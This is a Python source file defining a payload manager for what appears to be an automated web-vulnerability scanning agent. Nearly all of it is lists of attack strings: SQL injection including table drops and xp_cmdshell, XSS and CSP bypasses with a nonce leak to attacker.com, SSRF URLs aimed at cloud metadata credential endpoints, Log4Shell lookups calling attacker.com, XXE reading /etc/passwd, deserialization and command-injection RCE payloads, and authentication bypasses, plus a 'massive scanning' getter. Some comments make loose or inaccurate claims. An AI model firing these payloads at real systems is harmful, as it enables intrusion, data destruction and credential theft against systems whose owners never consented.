import random
from typing import List, Dict

class PayloadManager:
    """
    Manages real-world security payloads for the agent.
    Updated with 2025 WAF Bypass, Cloud Native, and OWASP Top 10 2025 techniques.
    """
    
    def __init__(self):
        # --- SQL Injection (2025 Edition: JSON-Based & PostgreSQL CVE-2025-1094) ---
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "admin' --",
            "admin' #",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "admin'/*",
            # 2025: Stacked Queries
            "'; DROP TABLE users;--",
            "'; EXEC xp_cmdshell('whoami');--"
        ]
        
        self.sqli_time_based = [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "' OR SLEEP(5)#",
            "'; pg_sleep(5)--",
            "(SELECT BENCHMARK(1000000,MD5('A')))",
            "' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>97,SLEEP(5),SLEEP(0))--",
            # 2025: Blind SQLi with conditional timing
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
        ]
        
        # 2025: JSON-Based SQLi (bypasses Palo Alto, F5, Imperva, AWS WAF, Cloudflare)
        self.sqli_json_bypass = [
            '{"username": "admin\' OR 1=1--", "password": "x"}',
            '{"id": "1\' UNION SELECT password FROM users--"}',
            '{"search": "\' OR \'1\'=\'1\' /*"}',
            '{"filter": {"$ne": null}}',  # NoSQL Injection
            # 2025: PostgreSQL CVE-2025-1094 exploitation attempt
            "'; SELECT * FROM pg_read_file('/etc/passwd');--"
        ]
        
        self.sqli_waf_bypass = [
            "' OR 0x534c454550283529--", # Hex Encoded SLEEP(5)
            "%23?%0auion%20?%23?%0aselect", # URL Encoded Obfuscation
            "'/*! UnIon/*trick-comment*/*/ sElect 1,2,3--", # Comment Obfuscation
            "admin' OR 1=1 /*!50000UNION*/ SELECT 1,2,3--", # Version specific comment
            # 2025: HTTP Header Injection
            "' OR '1'='1' -- (injected via User-Agent)",
            # 2025: GraphQL SQLi
            "query{user(id:\"1' OR '1'='1\"){name}}"
        ]
        
        # --- XSS (2025 Edition: CSP Bypass & AI-Driven Evasion) ---
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            # 2025: MathML payload
            "<math><mtext><script>alert(1)</script></mtext></math>"
        ]
        
        # 2025: CSP Bypass Techniques
        self.xss_csp_bypass = [
            # JSONP endpoint exploitation
            "<script src='https://trusted-domain.com/jsonp?callback=alert'></script>",
            # base tag manipulation
            "<base target='_blank' href='javascript:alert(1)'>",
            # iframe srcdoc abuse
            "<iframe srcdoc='<script>alert(1)</script>'>",
            # Nonce leakage via CSS
            "<style>@import'https://attacker.com/leak?nonce='+document.querySelector('meta[name=csp-nonce]').content</style>",
            # AngularJS sandbox escape (legacy apps)
            "{{constructor.constructor('alert(1)')()}}",
            # Mutation XSS
            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>"
        ]
        
        self.xss_polyglots = [
            "javascript://%250Aalert(1)//\"/*\\'/*\\'/*\"/*--></Script><Image Src=x OnError=alert(1)>",
            "\"`'><script>alert(1)</script>",
            "';alert(1)//",
            # 2025: Ultimate Polyglot (works in HTML, JS, CSS contexts)
            "jaVasCript:/*-/*\\`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
            "--> <svg onload=alert()>",
            # 2025: AI-generated polymorphic payload
            "<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"
        ]
        
        # --- SSRF (2025 Edition: IMDSv2 & Multi-Cloud) ---
        self.ssrf_cloud = [
            # AWS IMDSv1 (legacy)
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            # 2025: AWS IMDSv2 bypass attempt (requires PUT token)
            "http://169.254.169.254/latest/api/token",
            # Azure (with required header: Metadata: true)
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            # GCP (requires header: Metadata-Flavor: Google)
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            # 2025: Gopher protocol for header injection (GCP)
            "gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0AHost:%20metadata.google.internal%0AMetadata-Flavor:%20Google%0A%0A",
            # Internal services
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://0x7f000001/",  # Hex encoded localhost
            "http://[::1]/",  # IPv6 localhost
            # File access
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            # 2025: Cloud service discovery
            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
            # Redis/Memcached exploitation
            "gopher://127.0.0.1:6379/_FLUSHALL",
            "dict://127.0.0.1:11211/stats"
        ]
        
        # --- Fuzzing / Anomalies (2025: Supply Chain & Mishandled Exceptions) ---
        self.fuzz_payloads = [
            "A" * 1000,  # Buffer Overflow
            "../../../../etc/passwd",  # Path Traversal
            "..\\..\\..\\..\\windows\\system32\\config\\sam",  # Windows Path Traversal
            "%00",  # Null byte
            "{{7*7}}",  # SSTI (Jinja2)
            "${7*7}",  # SSTI (Freemarker)
            "#{7*7}",  # SSTI (Ruby)
            "<!--",  # Unclosed comment
            "'",  # Single quote
            "\"",  # Double quote
            ";",  # Terminator
            "|",  # Pipe
            "$(id)",  # Command Injection
            "`whoami`",  # Command Injection
            # 2025: Log4Shell variants
            "${jndi:ldap://attacker.com/a}",
            "${jndi:dns://attacker.com}",
            # 2025: Prototype Pollution
            '{"__proto__":{"isAdmin":true}}',
            # 2025: XXE (XML External Entity)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            # 2025: Deserialization attacks
            'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
            # 2025: Race condition trigger
            "CONCURRENT_REQUEST_" + str(random.randint(1, 1000))
        ]
        
        # 2025: Supply Chain Attack Payloads
        self.supply_chain_payloads = [
            # Malicious package names (typosquatting)
            "reqeusts",  # typo of 'requests'
            "python-dateutil",  # legitimate but could be compromised
            # Dependency confusion
            "internal-company-package-v2",
            # Build system exploitation
            "../../../.git/config",
            # Environment variable injection
            "NODE_OPTIONS=--require=/tmp/malicious.js"
        ]
        
        # 2025: Insecure Deserialization (OWASP A08)
        self.deserialization_payloads = [
            # PHP Object Injection
            'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
            'O:8:"Evil":1:{s:7:"command";s:10:"phpinfo();";}',
            # Java Deserialization
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
            # Python Pickle
            "cos\nsystem\n(S'whoami'\ntR.",
            # .NET Deserialization
            'AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0=',
            # Node.js
            '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\')}()"}',
        ]
        
        # 2025: Cryptographic Failures (OWASP A04)
        self.crypto_attack_payloads = [
            # Weak cipher detection
            "TLS_RSA_WITH_RC4_128_MD5",
            "TLS_RSA_WITH_DES_CBC_SHA",
            # Hash collision (MD5)
            "d131dd02c5e6eec4693d9a0698aff95c",
            # Padding oracle
            "AAAAAAAAAAAAAAAA",
            # ECB mode detection
            "0000000000000000" * 4,
            # Weak random
            "predictable_token_12345",
        ]
        
        # 2025: Race Condition Exploits (OWASP A06 - Insecure Design)
        self.race_condition_payloads = [
            # TOCTOU (Time-of-check to time-of-use)
            "RACE_CONDITION_TEST",
            # Concurrent requests marker
            "CONCURRENT_" + str(random.randint(1000, 9999)),
            # Double spending
            "DOUBLE_SPEND_ATTEMPT",
        ]
        
        # 2025: Log Injection (OWASP A09)
        self.log_injection_payloads = [
            # CRLF Injection
            "admin\r\n[INFO] Fake log entry",
            "user\n2025-01-01 00:00:00 [CRITICAL] Injected",
            # Log forging
            "\n\n[2025-01-01] [ERROR] Authentication failed for admin",
            # ANSI escape codes
            "\x1b[31mCRITICAL ERROR\x1b[0m",
            # Null byte log bypass
            "admin\x00HIDDEN_DATA",
        ]
        
        # 2025: Business Logic Flaws (OWASP A06)
        self.business_logic_payloads = [
            # Negative quantity
            "-1",
            "-999999",
            # Price manipulation
            "0.01",
            "0",
            # Overflow attempts
            "999999999999999",
            "2147483647",  # Max int32
            # Coupon abuse
            "DISCOUNT100",
            "FREESHIP" * 10,
        ]
        
        # 2025: Authentication Bypass (OWASP A07)
        self.auth_bypass_payloads = [
            # JWT None Algorithm
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
            # SQL Auth Bypass
            "admin' OR '1'='1' --",
            # LDAP Injection
            "*)(uid=*))(|(uid=*",
            # OAuth bypass
            "redirect_uri=http://attacker.com",
            # Session fixation
            "PHPSESSID=attacker_session",
        ]


    def get_sqli(self, complexity: str = "simple") -> str:
        """Get an SQLi payload based on complexity"""
        if complexity == "time":
            return random.choice(self.sqli_time_based)
        elif complexity == "bypass":
            return random.choice(self.sqli_waf_bypass)
        elif complexity == "json":
            return random.choice(self.sqli_json_bypass)
        return random.choice(self.sqli_payloads)

    def get_xss(self, complexity: str = "simple") -> str:
        """Get an XSS payload"""
        if complexity == "polyglot":
            return random.choice(self.xss_polyglots)
        elif complexity == "csp_bypass":
            return random.choice(self.xss_csp_bypass)
        return random.choice(self.xss_payloads)
        
    def get_ssrf(self) -> str:
        """Get an SSRF payload"""
        return random.choice(self.ssrf_cloud)

    def get_fuzz(self) -> str:
        """Get a fuzzing payload"""
        return random.choice(self.fuzz_payloads)
    
    def get_supply_chain(self) -> str:
        """Get a supply chain attack payload (2025 OWASP A03)"""
        return random.choice(self.supply_chain_payloads)
    
    def get_deserialization(self) -> str:
        """Get an insecure deserialization payload (2025 OWASP A08)"""
        return random.choice(self.deserialization_payloads)
    
    def get_crypto_attack(self) -> str:
        """Get a cryptographic attack payload (2025 OWASP A04)"""
        return random.choice(self.crypto_attack_payloads)
    
    def get_race_condition(self) -> str:
        """Get a race condition payload (2025 OWASP A06)"""
        return random.choice(self.race_condition_payloads)
    
    def get_log_injection(self) -> str:
        """Get a log injection payload (2025 OWASP A09)"""
        return random.choice(self.log_injection_payloads)
    
    def get_business_logic(self) -> str:
        """Get a business logic flaw payload (2025 OWASP A06)"""
        return random.choice(self.business_logic_payloads)
    
    def get_auth_bypass(self) -> str:
        """Get an authentication bypass payload (2025 OWASP A07)"""
        return random.choice(self.auth_bypass_payloads)
        
    def get_all_payloads(self) -> List[str]:
        """Return a flat list of all payloads for massive scanning"""
        return (self.sqli_payloads + self.sqli_time_based + self.sqli_waf_bypass + 
                self.sqli_json_bypass + self.xss_payloads + self.xss_polyglots + 
                self.xss_csp_bypass + self.ssrf_cloud + self.fuzz_payloads + 
                self.supply_chain_payloads + self.deserialization_payloads +
                self.crypto_attack_payloads + self.race_condition_payloads +
                self.log_injection_payloads + self.business_logic_payloads +
                self.auth_bypass_payloads)
